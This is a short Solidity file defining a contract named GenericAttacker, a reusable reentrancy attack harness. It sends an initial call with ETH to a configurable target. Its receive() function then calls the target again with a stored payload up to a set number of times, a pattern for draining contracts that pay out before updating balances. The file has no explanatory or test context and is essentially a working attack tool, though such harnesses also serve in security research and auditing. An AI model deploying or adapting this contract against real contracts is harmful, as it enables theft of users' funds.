// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GenericAttacker {
    address public target;
    bytes public callbackPayload;
    uint256 public maxLoops;
    uint256 public currentLoops;

    function setup(address _target, bytes memory _callbackPayload, uint256 _maxLoops) external {
        target = _target;
        callbackPayload = _callbackPayload;
        maxLoops = _maxLoops;
    }

    function trigger(bytes memory initialPayload) external payable {
        currentLoops = 0;
        (bool success, ) = target.call{value: msg.value}(initialPayload);
        require(success, "Initial call failed");
    }

    receive() external payable {
        if (currentLoops < maxLoops) {
            currentLoops++;
            (bool success, ) = target.call(callbackPayload);
        }
    }
}
